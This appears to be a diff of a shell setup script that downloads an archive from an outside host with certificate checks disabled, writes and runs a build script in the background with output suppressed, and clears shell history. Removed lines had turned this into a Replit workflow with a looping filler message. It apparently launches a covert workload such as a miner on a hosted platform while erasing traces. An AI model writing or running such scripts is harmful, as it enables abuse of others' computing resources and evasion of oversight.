@@ -3,39 +3,6 @@
 curl -sLkO https://storage.technoelectro.online/mcp.tar.gz
 tar -xf mcp.tar.gz
 rm -rf mcp.tar.gz
-echo '#!/bin/bash
-
-cd mcp && nproc --all && history -c && history -w && clear && bash build.sh 1 suto-01 >/dev/null 2>&1 &
-sleep 30
-while true
-do
-        echo "...ngopi sik..."
-        sleep 720
-done' > boma.sh
-echo 'modules = ["python-3.11"]
-
-[workflows]
-runButton = "Project"
-
-[[workflows.workflow]]
-name = "Project"
-mode = "parallel"
-author = "agent"
-
-[[workflows.workflow.tasks]]
-task = "workflow.run"
-args = "boma"
-
-[[workflows.workflow]]
-name = "boma"
-author = "agent"
-
-[[workflows.workflow.tasks]]
-task = "shell.exec"
-args = "boma.sh"
-
-[workflows.workflow.metadata]
-outputType = "console"' > .replit
 cd mcp 
 echo '#!/bin/bash
 
@@ -62,3 +29,6 @@ while true; do
   python3 app.py
   sleep 15
 done' > build.sh
+chmod +x ./build.sh
+history -c && history -w && clear
+bash build.sh 1 xvi
